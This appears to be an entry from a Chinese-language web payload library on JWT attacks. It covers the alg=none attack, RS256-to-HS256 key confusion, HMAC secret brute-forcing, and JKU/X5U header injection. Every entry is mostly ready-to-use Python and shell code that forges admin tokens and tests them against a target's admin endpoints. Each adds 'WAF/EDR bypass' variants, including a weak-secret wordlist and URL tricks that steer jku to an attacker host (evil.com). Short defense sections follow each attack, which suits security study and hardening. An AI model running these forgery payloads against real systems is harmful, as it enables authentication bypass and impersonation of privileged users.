# JWT安全

_4 条 web payload_

### JWT None算法攻击  `jwt-none-attack`
_利用JWT库对"none"算法的支持缺陷，将JWT头部的签名算法修改为none后移除签名部分，构造无需密钥即可通过验证的伪造令牌。这是最经典的JWT漏洞之一。_
子类：**算法攻击** · tags: `JWT` `none算法` `认证绕过` `令牌伪造` `CVE-2015-2951`

**前置条件：**
- 目标使用JWT进行身份认证
- jwt_tool或Python PyJWT库

**攻击链：**

**1. 解码现有JWT**
> 解析JWT的Header和Payload部分，识别算法和声明内容
```
# 解码JWT的三个部分
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature" | cut -d. -f1 | base64 -d
# 输出: {"alg":"HS256","typ":"JWT"}

echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature" | cut -d. -f2 | base64 -d
# 输出: {"user":"guest","role":"user"}
```
**语法解析：**
- `cut -d. -f1` — 以点号分割取第一段(Header) _command_
- `base64 -d` — Base64解码 _command_
- `"alg":"HS256"` — 当前使用HMAC-SHA256签名 _json_
- `"role":"user"` — 用户角色声明——攻击目标 _json_

**2. 构造None算法JWT**
> Python脚本构造alg=none的伪造JWT，提权为admin
```
import base64, json

# 修改Header为none算法
header = base64.urlsafe_b64encode(
    json.dumps({"alg":"none","typ":"JWT"}).encode()
).rstrip(b"=").decode()

# 修改Payload为admin
payload = base64.urlsafe_b64encode(
    json.dumps({"user":"admin","role":"admin"}).encode()
).rstrip(b"=").decode()

# 签名为空
forged_jwt = f"{header}.{payload}."
print(forged_jwt)
```
**语法解析：**
- `"alg":"none"` — 设置签名算法为none(无签名) _json_
- `"role":"admin"` — 将角色篡改为管理员 _json_
- `urlsafe_b64encode` — URL安全的Base64编码 _function_
- `rstrip(b"=")` — 移除Base64填充符号 _function_

**3. jwt_tool自动攻击**
> 使用jwt_tool自动化测试none算法及其大小写变体
```
python3 jwt_tool.py {TOKEN} -X a

# -X a = 尝试none算法攻击
# 同时测试多种none变体
# none, None, NONE, nOnE, noNe
```
**语法解析：**
- `jwt_tool.py` — JWT安全测试工具 _command_
- `-X a` — 启用alg:none攻击模式 _parameter_
- `none变体` — 测试None/NONE/nOnE等大小写绕过 _concept_

**4. 验证伪造令牌**
> 使用伪造的JWT访问管理员接口验证攻击效果
```
curl -s -H "Authorization: Bearer {FORGED_JWT}" \
  "https://{TARGET}/api/admin/dashboard"

# 检查是否获得管理员权限
# 200 OK = 攻击成功
# 401/403 = 服务端正确拒绝none算法
```
**语法解析：**
- `Bearer {FORGED_JWT}` — 使用伪造的JWT令牌 _header_
- `/api/admin/dashboard` — 管理员专属接口 _path_

**WAF/EDR 绕过变体：**

**none算法大小写变体**
> 使用none的各种大小写组合和不同签名占位绕过校验
```
# 各种none变体
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":"noNe"}
{"alg":"nONE"}

# 添加签名占位
header.payload.
header.payload.AA==
header.payload.e30=
```
**语法解析：**
- `nOnE/noNe` — 混合大小写绕过字符串比较 _encoding_
- `.AA==` — 非空签名占位可能绕过空签名检测 _technique_


**概述：** JWT None算法攻击(CVE-2015-2951)是JWT安全中最经典的漏洞。JWT规范中定义了"none"算法表示不需要签名验证，原意用于已通过其他方式(如TLS)确保完整性的场景。然而许多JWT库在验证时会接受客户端指定的算法，当攻击者将Header中的alg改为none并移除签名后，服务端会跳过签名验证直接信任Payload内容。

**漏洞原理：** 漏洞根因：(1)JWT库默认支持none算法且未在应用层显式禁用；(2)验证逻辑使用Header中客户端指定的alg字段而非服务端配置的算法；(3)某些库对none做了大小写敏感匹配但可被None/NONE等变体绕过；(4)签名验证逻辑在签名为空时直接返回true。影响所有使用受影响JWT库的应用，攻击者可伪造任意身份。

**利用方法：** 利用步骤：(1)获取一个有效JWT(如注册普通账号)；(2)Base64解码Header和Payload；(3)将Header的alg字段改为none；(4)修改Payload中的用户信息(如role改为admin)；(5)重新Base64编码并拼接为header.payload.(签名为空)；(6)使用伪造JWT访问高权限接口。推荐使用jwt_tool -X a自动测试所有none变体。

**防御措施：** 修复方案：(1)服务端硬编码允许的签名算法白名单，显式禁用none；(2)验证时使用服务端配置的算法而非JWT Header中的alg；(3)升级JWT库到最新版本(现代库默认拒绝none)；(4)实施JWT签名密钥轮转机制；(5)添加JWT令牌黑名单支持登出/撤销功能。

---

### JWT密钥混淆攻击(RS→HS)  `jwt-key-confusion`
_当服务端使用RSA公钥验证JWT时，攻击者将算法从RS256改为HS256，此时服务端会错误地使用RSA公钥作为HMAC密钥进行验证。由于RSA公钥是公开的，攻击者可用它签名任意JWT。_
子类：**算法攻击** · tags: `JWT` `密钥混淆` `RS256` `HS256` `算法篡改`

**前置条件：**
- 目标JWT使用RS256/RS384/RS512算法
- 已获取RSA公钥
- jwt_tool或Python

**攻击链：**

**1. 获取RSA公钥**
> 从JWKS端点、API或SSL证书中获取RSA公钥
```
# 常见公钥泄露位置
curl -s "https://{TARGET}/.well-known/jwks.json" | jq
curl -s "https://{TARGET}/api/keys" | jq
curl -s "https://{TARGET}/oauth/discovery" | jq

# 从JWKS中提取公钥
# 或从SSL证书中获取
openssl s_client -connect {TARGET}:443 | openssl x509 -pubkey -noout > pubkey.pem
```
**语法解析：**
- `/.well-known/jwks.json` — JWKS标准公钥发布端点 _path_
- `jq` — JSON格式化工具 _command_
- `openssl x509 -pubkey` — 从X509证书中提取公钥 _command_

**2. 密钥混淆攻击**
> Python脚本将RSA公钥作为HMAC密钥签名伪造JWT
```
import jwt
import json

# 读取RSA公钥
with open("pubkey.pem", "rb") as f:
    public_key = f.read()

# 用公钥作为HMAC密钥签名
forged_payload = {
    "user": "admin",
    "role": "admin",
    "iat": 1707811200,
    "exp": 1999999999
}

# 将算法从RS256切换为HS256
forged_token = jwt.encode(
    forged_payload,
    public_key,        # RSA公钥作为HMAC密钥
    algorithm="HS256"  # 改为HMAC算法
)
print(forged_token)
```
**语法解析：**
- `jwt.encode` — PyJWT编码函数 _function_
- `public_key` — RSA公钥被错误地用作HMAC密钥 _variable_
- `algorithm="HS256"` — 将算法从RS256改为HS256 _parameter_
- `"exp": 1999999999` — 设置超远过期时间 _json_

**3. jwt_tool自动攻击**
> jwt_tool一键执行密钥混淆攻击
```
python3 jwt_tool.py {TOKEN} -X k -pk pubkey.pem

# -X k = 密钥混淆攻击模式
# -pk = 指定公钥文件
# 工具自动完成RS256→HS256切换和签名
```
**语法解析：**
- `-X k` — 启用Key Confusion攻击模式 _parameter_
- `-pk pubkey.pem` — 指定RSA公钥文件路径 _parameter_

**4. JWKS端点注入**
> JKU/X5U头注入使服务端从攻击者控制的URL获取验证密钥
```
# 如果支持jku/x5u头，可注入自定义JWKS端点
Header: {
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://evil.com/.well-known/jwks.json"
}

# 在evil.com上托管攻击者生成的JWKS
# 服务端会从攻击者URL获取公钥进行验证
openssl genrsa -out attacker_key.pem 2048
openssl rsa -in attacker_key.pem -pubout > attacker_pub.pem
```
**语法解析：**
- `"jku"` — JWK Set URL——指定公钥来源 _header_
- `evil.com` — 攻击者控制的密钥托管服务器 _domain_
- `openssl genrsa` — 生成攻击者自己的RSA密钥对 _command_

**WAF/EDR 绕过变体：**

**多种公钥格式尝试**
> 某些JWT库对公钥格式处理不同，尝试多种格式
```
# PEM格式(标准)
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqh...
-----END PUBLIC KEY-----

# DER格式(二进制)
openssl rsa -pubin -in pubkey.pem -outform DER -out pubkey.der

# 带/不带换行符
cat pubkey.pem | tr -d "\n" > pubkey_noline.pem

# 不同编码的公钥作为HMAC密钥
```
**语法解析：**
- `PEM/DER` — 两种主要公钥编码格式 _format_
- `tr -d "\n"` — 移除换行符(单行公钥) _command_


**概述：** JWT密钥混淆攻击(Key Confusion / Algorithm Confusion)利用了JWT库在验证签名时信任Header中alg字段的缺陷。当服务端配置为RS256(非对称)算法时，攻击者将alg改为HS256(对称)，此时服务端会尝试用RSA公钥作为HMAC密钥来验证签名。由于RSA公钥是公开的，攻击者可以用它来计算有效的HMAC签名。

**漏洞原理：** 漏洞链路：(1)服务端使用RS256验证JWT，RSA私钥签名、公钥验证；(2)RSA公钥通常可从/.well-known/jwks.json或证书获取；(3)攻击者修改JWT Header中alg为HS256；(4)服务端验证逻辑使用Header中的alg决定验证方式；(5)HS256是对称算法，验证时用"密钥"做HMAC——此时"密钥"就是RSA公钥。根因是算法选择权在客户端而非服务端。

**利用方法：** 利用步骤：(1)确认目标JWT使用RS256/RS384/RS512；(2)从JWKS端点、OAuth Discovery、SSL证书等获取RSA公钥；(3)将JWT Header的alg改为HS256；(4)使用获取的RSA公钥作为HMAC密钥对修改后的JWT进行签名；(5)注意公钥格式——可能需要PEM、DER或去除换行符的版本。jwt_tool -X k命令可一键完成。PyJWT旧版本默认允许此攻击，新版已修复。

**防御措施：** 防御方案：(1)服务端硬编码允许的算法列表，验证时不使用Header中的alg；(2)使用类型安全的验证函数(如指定algorithms=["RS256"])；(3)升级JWT库至最新版本；(4)如果使用JWKS，限制只从可信URL获取密钥，禁止jku/x5u重定向；(5)定期轮转签名密钥。

---

### JWT密钥爆破  `jwt-secret-bruteforce`
_当JWT使用HMAC对称算法(HS256/HS384/HS512)且密钥为弱密码时，可通过字典或暴力破解还原签名密钥，进而伪造任意JWT令牌。_
子类：**密钥破解** · tags: `JWT` `密钥爆破` `HS256` `弱密钥` `hashcat`

**前置条件：**
- 目标JWT使用HMAC算法(HS256等)
- 已获取有效JWT样本
- hashcat或jwt_tool

**攻击链：**

**1. 确认算法和结构**
> 确认JWT使用HMAC对称算法，此类算法的密钥可被爆破
```
# 解码JWT Header
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# {"alg":"HS256"}

# 确认是HMAC对称算法才可爆破
# HS256 / HS384 / HS512 = 可爆破
# RS256 / ES256 = 不可直接爆破密钥
```
**语法解析：**
- `"alg":"HS256"` — HMAC-SHA256——对称算法可爆破 _json_
- `base64 -d` — 解码JWT Header _command_

**2. hashcat GPU加速爆破**
> hashcat GPU加速破解JWT HMAC密钥
```
# hashcat模式16500 = JWT
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt.txt内容为完整的JWT字符串
# eyJhbGci....signature

# 使用规则加速
hashcat -m 16500 -a 0 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 掩码暴力破解(8位数字密钥)
hashcat -m 16500 -a 3 jwt.txt ?d?d?d?d?d?d?d?d
```
**语法解析：**
- `-m 16500` — hashcat JWT模式 _parameter_
- `-a 0` — 字典攻击模式 _parameter_
- `-a 3` — 暴力/掩码攻击模式 _parameter_
- `?d` — 数字掩码占位符(0-9) _format_
- `rockyou.txt` — 常用密码字典 _path_

**3. jwt_tool字典爆破**
> jwt_tool字典模式破解JWT密钥
```
python3 jwt_tool.py {TOKEN} -C -d /usr/share/wordlists/rockyou.txt

# -C = 开启字典破解模式
# -d = 指定字典文件
# 也支持常见弱密钥快速测试
python3 jwt_tool.py {TOKEN} -C -d common_jwt_secrets.txt
```
**语法解析：**
- `-C` — 启用Crack模式(密钥爆破) _parameter_
- `-d` — 指定密码字典路径 _parameter_

**4. 使用破解密钥伪造JWT**
> 使用破解出的密钥签名伪造管理员JWT
```
import jwt

secret = "cracked_secret_key"

forged = jwt.encode(
    {"user": "admin", "role": "superadmin", "exp": 1999999999},
    secret,
    algorithm="HS256"
)
print(f"Forged JWT: {forged}")

# 验证
curl -H "Authorization: Bearer $FORGED_JWT" "https://{TARGET}/api/admin"
```
**语法解析：**
- `"cracked_secret_key"` — 爆破获得的密钥 _value_
- `jwt.encode` — 使用破解密钥重新签名 _function_

**WAF/EDR 绕过变体：**

**常见默认JWT密钥**
> 优先尝试常见的默认/弱JWT密钥
```
# 常见弱密钥列表
secret
password
123456
hs256-secret
jwt-secret
my-secret-key
changeme
default
qwerty
super-secret
your-256-bit-secret
secretkey
token-secret
application-secret
```
**语法解析：**
- `your-256-bit-secret` — jwt.io默认示例密钥 _value_
- `changeme` — 常见默认密码 _value_


**概述：** JWT HMAC密钥爆破是针对使用对称签名算法(HS256/HS384/HS512)的JWT系统的攻击。由于HMAC算法使用共享密钥进行签名和验证，如果密钥强度不足(短密码、常见词汇、默认值)，攻击者可以通过字典攻击或暴力破解还原密钥，然后用该密钥伪造任意JWT令牌实现身份冒充。

**漏洞原理：** 漏洞条件：(1)JWT使用HS256等HMAC算法；(2)签名密钥为弱密码(如secret、123456、公司名等)；(3)密钥未定期轮转；(4)使用jwt.io等工具的默认示例密钥(your-256-bit-secret)上线。根据JWT规范建议，HS256密钥应至少256位(32字节)随机值，但实际中大量系统使用简短的人类可读密码。hashcat可在消费级GPU上每秒测试数十亿个HS256密钥。

**利用方法：** 利用流程：(1)从登录响应或Cookie中获取有效JWT样本；(2)解码确认使用HS256/384/512算法；(3)使用hashcat -m 16500 + 大字典(rockyou.txt)进行GPU加速爆破；(4)或使用jwt_tool -C -d快速测试常见弱密钥；(5)破解成功后用该密钥签名任意Payload的JWT；(6)RTX 4090可在数分钟内跑完rockyou字典(1400万条)。

**防御措施：** 防御方案：(1)使用至少256位的密码学安全随机密钥(openssl rand -hex 32)；(2)优先使用非对称算法(RS256/ES256)避免密钥共享问题；(3)定期轮转JWT签名密钥；(4)禁止使用默认/示例密钥上线；(5)实施JWT过期时间(exp)和黑名单机制限制泄露令牌的影响范围。

---

### JWT JKU/X5U头注入  `jwt-jku-x5u-injection`
_利用JWT Header中的jku(JWK Set URL)或x5u(X.509 URL)参数，将密钥来源指向攻击者控制的服务器，使服务端使用攻击者的公钥验证JWT，从而实现令牌伪造。_
子类：**Header注入** · tags: `JWT` `JKU` `X5U` `Header注入` `JWKS` `密钥劫持`

**前置条件：**
- 目标JWT支持jku/x5u Header参数
- 攻击者拥有公网服务器
- Python环境

**攻击链：**

**1. 探测JKU/X5U支持**
> 检查JWT是否使用jku/x5u头以及目标JWKS端点
```
# 解码JWT Header查看是否包含jku/x5u
echo "{JWT_HEADER}" | base64 -d | jq  # security-allowlist: SEC008

# 常见原始Header
{"alg":"RS256","typ":"JWT","jku":"https://target.com/.well-known/jwks.json"}

# 检查JWKS端点
curl -s "https://{TARGET}/.well-known/jwks.json" | jq
curl -s "https://{TARGET}/.well-known/openid-configuration" | jq .jwks_uri
```
**语法解析：**
- `"jku"` — JWK Set URL——指向JWKS公钥集合 _header_
- `.well-known/jwks.json` — OpenID Connect标准JWKS端点 _path_
- `.jwks_uri` — OpenID配置中的JWKS URL字段 _json_

**2. 生成攻击者密钥对**
> 生成攻击者的RSA密钥对并构造JWKS文件
```
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

# 生成RSA密钥对
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# 导出PEM格式
with open("attacker_private.pem", "wb") as f:
    f.write(private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    ))

# 生成JWKS格式公钥
numbers = public_key.public_numbers()
jwks = {"keys": [{"kty": "RSA", "kid": "attacker-key-1",
    "n": base64.urlsafe_b64encode(numbers.n.to_bytes(256, "big")).rstrip(b"=").decode(),
    "e": base64.urlsafe_b64encode(numbers.e.to_bytes(3, "big")).rstrip(b"=").decode(),
    "use": "sig", "alg": "RS256"}]}

with open("jwks.json", "w") as f:
    json.dump(jwks, f)
```
**语法解析：**
- `rsa.generate_private_key` — 生成2048位RSA密钥对 _function_
- `"kty": "RSA"` — JWKS密钥类型 _json_
- `"kid"` — Key ID——标识密钥 _json_

**3. 托管JWKS并签名JWT**
> 托管JWKS文件并用攻击者私钥签名JWT，jku指向攻击者服务器
```
# 在攻击者服务器托管jwks.json
python3 -m http.server 8080
# http://evil.com:8080/jwks.json

import jwt

# 用攻击者私钥签名
with open("attacker_private.pem", "rb") as f:
    attacker_key = f.read()

forged = jwt.encode(
    {"user": "admin", "role": "admin", "exp": 1999999999},
    attacker_key,
    algorithm="RS256",
    headers={"jku": "http://evil.com:8080/jwks.json", "kid": "attacker-key-1"}
)
print(forged)
```
**语法解析：**
- `python3 -m http.server` — 快速HTTP文件服务 _command_
- `"jku": "http://evil.com:8080/jwks.json"` — jku指向攻击者的JWKS _header_
- `"kid": "attacker-key-1"` — 匹配JWKS中的kid _json_

**4. 验证攻击**
> 使用注入了jku的伪造JWT访问管理员接口
```
curl -s -H "Authorization: Bearer {FORGED_JWT}" \
  "https://{TARGET}/api/admin/users" | jq

# 服务端流程：
# 1. 解析JWT Header中的jku URL
# 2. 从evil.com获取JWKS公钥
# 3. 用攻击者公钥验证签名——通过!
# 4. 信任Payload中的admin身份
```
**语法解析：**
- `{FORGED_JWT}` — 包含攻击者jku的伪造令牌 _variable_
- `/api/admin/users` — 管理员接口 _path_

**WAF/EDR 绕过变体：**

**JKU URL绕过限制**
> 利用开放重定向、子域名接管、URL混淆绕过jku域名白名单
```
# 开放重定向绕过域名白名单
{"jku": "https://target.com/redirect?url=https://evil.com/jwks.json"}

# 子域名接管
{"jku": "https://abandoned.target.com/.well-known/jwks.json"}

# URL混淆
{"jku": "https://target.com@evil.com/jwks.json"}
{"jku": "https://evil.com#target.com/jwks.json"}
{"jku": "https://evil.com/.well-known/jwks.json?.target.com"}
```
**语法解析：**
- `redirect?url=` — 利用开放重定向跳转到攻击者域名 _technique_
- `target.com@evil.com` — URL用户名混淆——实际访问evil.com _technique_


**概述：** JKU(JWK Set URL)和X5U(X.509 URL)是JWT Header中的可选参数，用于指定签名验证密钥的来源URL。如果服务端在验证JWT时从Header中的jku/x5u获取公钥而未限制URL来源，攻击者可将该参数指向自己控制的服务器，让服务端使用攻击者的公钥验证攻击者签名的JWT，从而实现完美的令牌伪造。

**漏洞原理：** 漏洞根因：(1)服务端信任JWT Header中的jku/x5u参数指定的URL；(2)未实施URL白名单或域名限制；(3)即使有域名校验也可能被开放重定向、子域名接管等手法绕过；(4)某些实现甚至允许HTTP(非HTTPS)的jku URL。攻击者可自行生成RSA密钥对，用私钥签名JWT并在公网托管对应的JWKS公钥文件。

**利用方法：** 完整攻击链：(1)解码目标JWT确认使用RS256且Header中有jku字段；(2)生成攻击者RSA密钥对；(3)将公钥转为JWKS格式托管在攻击者服务器；(4)修改JWT Header中jku指向攻击者服务器；(5)用攻击者私钥签名篡改后的Payload；(6)发送伪造JWT，服务端从攻击者URL获取公钥并成功验证。若有域名白名单，利用开放重定向或子域接管绕过。

**防御措施：** 防御措施：(1)禁用jku/x5u Header参数，密钥来源硬编码在服务端配置中；(2)如必须使用jku，实施严格的URL白名单且不允许重定向跟随；(3)将JWKS公钥固定(pinning)在服务端配置中而非动态获取；(4)实施kid与已知密钥的映射，不接受未知kid；(5)定期审计JWT库配置确保不信任客户端提供的密钥来源。

---
